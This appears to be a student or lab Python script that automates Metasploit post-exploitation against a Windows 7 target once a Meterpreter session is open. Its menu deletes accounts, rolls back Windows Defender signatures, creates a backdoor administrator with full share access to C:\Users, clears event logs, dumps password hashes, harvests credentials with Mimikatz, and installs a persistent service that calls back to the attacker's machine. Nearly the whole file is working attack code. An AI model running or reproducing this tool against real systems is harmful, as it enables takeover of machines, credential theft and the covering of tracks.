
# First, the different Python packages that will be used throughout the code are imported
# All of the ones used in this code come by default with the programming language
import subprocess  # To send information to a shell
import socket      # To create a connection
import getpass     # To obtain the user executing the code

# The following function creates a connection with a Google's DNS and, looking at the properties
# Based on those properties, it obtains the IP address with which the connection was created, which is the IPv4 of the
# machine.
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))  # Connection to Google's DNS 8.8.8.8
    ip = s.getsockname()[0]  # The name of the socket is the IP address of the client.
    s.close()  # CLose the connection.
    return ip  # It returns the value to be used in the code

#  Function to delete the user account in the targeted system. The username will be provided by the attacker.
def delete_user(user):
    # Background the Meterpreter session to use the msfconsole directly.
    msfconsole_process.stdin.write(("background\n").encode())
    # Module designed to delete users in windows systems.
    msfconsole_process.stdin.write(("use windows/manage/delete_user\n").encode())
    # The session 1 is the one created originally with the machine to obtain the meterpreter session.
    msfconsole_process.stdin.write(("set SESSION 1\n").encode())
    msfconsole_process.stdin.write(("set USERNAME " + user + "\n").encode())
    msfconsole_process.stdin.write(("exploit\n").encode())
    print("User deleted\n")
    # In the following line, the meterpreter is brought back
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())

#  Disable Windows Defender Signatures
def disable_signatures():
    msfconsole_process.stdin.write(("background\n").encode())  # Background the Meterpreter session
    #  Module used to disable the Windows defender signatures.
    msfconsole_process.stdin.write(("use windows/manage/rollback_defender_signatures\n").encode())
    msfconsole_process.stdin.write(("exploit\n").encode())
    print("Signatures disabled\n")
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())  # The meterpreter session is brought back

#  The following function adds a user to the system with admin privileges and shared with it all the folders under Users
#  The attacker could access via SMB protocol.
def add_user(user,password):  # Recieves the username and password the attacker want.
    msfconsole_process.stdin.write(("shell\n").encode()) # In the meterpreter session, the Windows shell is called.
    # Is opened with administrator privileges.
    # The next line add the user following the syntax: net user USERNAME PASSWORD /add
    msfconsole_process.stdin.write(("net user " + user + " " + password + " /add\n").encode())
    # Add the user to the administrators' group.
    msfconsole_process.stdin.write(("net localgroup administrators " + user + " /add\n").encode())
    # Grant fullp permissions over C:\Users and all the information of the subdirectories under it.
    msfconsole_process.stdin.write((r"net share Users=C:\Users /grant:" + user + ",full\n").encode())
    msfconsole_process.stdin.write(("exit\n").encode())
    print(r"Your user is now administrator. The C:\Users was shared with you")
    # The session doesn't need to be brought back because it wasn't closed.

def persistence(service): # It receives the name of the service the attacker want to create
    # The session 1 is the one established with the machine.
    msfconsole_process.stdin.write(("set SESSION 1\n").encode())
    my_ip = get_local_ip()  # Automatically gets the IP
    # The following lines set the different options the module needs to run properly.
    msfconsole_process.stdin.write(("set SERVICE_NAME " + service + "\n").encode())
    # Set as LHOST the obtained attacker's IP.
    msfconsole_process.stdin.write(("set LHOST " + my_ip + "\n").encode())
    msfconsole_process.stdin.write(("set LPORT 1312\n").encode())
    msfconsole_process.stdin.write(("exploit\n").encode())
    print("Persistent service created\n")
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())  # The meterpreter session is opened again.

def hashes():
    current_user = getpass.getuser()  # Obtain the current user
    # THen, the current user is used to create the path in which the file with the hashes will be stored.
    path_to_hash = "/home/" + current_user + "/Desktop/hashes.txt"
    #  The meterpreter is in background to use msfconsole
    msfconsole_process.stdin.write(("background\n").encode())
    #  Module to obtain the hashes of the system.
    msfconsole_process.stdin.write(("use windows/gather/hashdump\n").encode())
    msfconsole_process.stdin.write(("set SESSION 1\n").encode())
    #  The spool command is used to take every output generated by metasploit since the command was used.
    #  And send it to a file. It receives as a parameter the path of the file (previously created in this code)
    #  Implementing it at this point means it will send to the file the output generated after execute the module.
    msfconsole_process.stdin.write(("spool " + path_to_hash + "\n").encode())
    msfconsole_process.stdin.write(("exploit\n").encode())
    print("Hashes obtained, file stored in " + path_to_hash + "\n")
    #  In the next line the "spool" command is turned off because it is not necessary any other output in the file.
    msfconsole_process.stdin.write(("spool off\n").encode())
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())  # Meterpreter session brought back.

def Mimikatz():   # Mimikatz stores the credentials of the system of the users that have logged in.

    current_user = getpass.getuser()  # Current user to create the path
    path_to_credentials = "/home/" + current_user + "/Desktop/Credentials.txt"
    msfconsole_process.stdin.write(("background\n").encode())  #  Send the meterpreter session to the background
    msfconsole_process.stdin.write(("spool " + path_to_credentials + "\n").encode())  # Start the spool command
    # Brought the session back because the Kiwi extension and the "creds_all" commands are valid in the meterpreter only
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())
    # Load the extension to obtain credentials
    msfconsole_process.stdin.write(("load kiwi\n").encode())
    msfconsole_process.stdin.write(("creds_all\n").encode())  # Execute the command
    msfconsole_process.stdin.write(("background\n").encode())  # Send the meterpreter session to background
    msfconsole_process.stdin.write(("spool off\n").encode())   # The spool command is disable
    print("Credentials obtained, file stored in " + path_to_credentials + "\n")
    msfconsole_process.stdin.write(("sessions -i 1\n").encode())  #The meterpreter session is brought back

current_user = getpass.getuser()
path_to_handler = "/home/"+current_user+"/handler.rc"  # This document needs to be in the home directory of the user.
#  It is implemented this way in case the user change, so it will not be necessary to modify the code.
# handler.rc is the file with the configurations to establish the meterpreter session with the Windows machine.
own_ip=get_local_ip()  # Get IP of the Kali machine
target_ip=input("Enter the IP address of your victim\n")  # Ask for IP address of the vulnerable Windows 7 machine
# In the following lines, the lines corresponding to RHOSTS and LHOSTS in "handler.rc" are rewritten, adapting them
# to the IP provided by the user and the IP of the machine that is running the attack.
new_line1 = ("set RHOSTS "+target_ip+"\n")
new_line2 = ("set LHOST "+own_ip+"\n")
with open(path_to_handler,'r') as file:
    change = file.readlines() # The lines are uploaded to a list of strings. Each position represents a string of a file
change[1] = new_line1  # Line 2 (cause the list starts in 0)
change[2] = new_line2  # Line 3
with open(path_to_handler,'w') as file:
    change = file.writelines(change)  # The changes are made.
    file.close()


#  In the next line, the session is created with the characteristics specified in the handler.rc to start the
#  meterpreter session with the machine.
msfconsole_process = subprocess.Popen(['msfconsole', '-q', '-r', path_to_handler],
                                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
error = msfconsole_process.stderr.readline().decode()  #  Stores error


#  The following error occurs because metasploit executes the stty command on a file that is not a terminal.
if 'stty: standard input: Inappropriate ioctl for device' in error:
    subprocess.run(['stty', '-F', '/dev/tty', '-T'])   # This set the attributes right.
session = 1  # Variable of control. Session active
while session == 1:
    output = msfconsole_process.stdout.readline().decode()  # Read the output and format it to be understandable.
    if output == '' and msfconsole_process.poll() is not None:
        print("No output")
    if 'Meterpreter session' in output: #  If the output indicates a meterpreter session was established, the following
        # code is executed.

        command = '' #  Variable that stores the decisions of the user
# In the following section, based on the inputs provided by the user, the functions previously defined are called.
# sending the parameters that correspond.
        while command != '3':
            command = input("What do you want to do now?\n1) Show post-exploitation modules"
                            "\n2) Implement persistence\n3) Exit\n")
            if command == '1':
                post_exploitation = input("Select your option\n1) Delete account\n2) Disable Windows Defender signatures"
                                          "\n3) Create a user in the victim\n4) CLear logs\n5) Obtain hashes"
                                          "\n6) Obtain Credentials\n")

                if (post_exploitation == '1'):
                    user = input("Username:\n")
                    delete_user(user)

                if post_exploitation == '2':
                    disable_signatures()

                if post_exploitation == '3':
                    user = input("Enter your username\n")
                    password = input("Enter your password\n")
                    add_user(user, password)

                if (post_exploitation == '4'):
                    msfconsole_process.stdin.write(("clearev\n").encode())
                    print("Logs cleared. You're good\n")

                if (post_exploitation== '5'):
                    hashes()

                if(post_exploitation=='6'):
                    Mimikatz()

            msfconsole_process.stdin.flush()

            if (command == '2'):
                msfconsole_process.stdin.write(("background\n").encode())
                msfconsole_process.stdin.write(("use windows/local/persistence_service\n").encode())
                service = input("Please provide a service name:\n")
                persistence(service)

        if command == '3':  # If the user decides to exit
            msfconsole_process.stdin.write(("sessions -K\n").encode())  # The session is killed
            session = 0  # The "while" loop ends, and the program finish. 
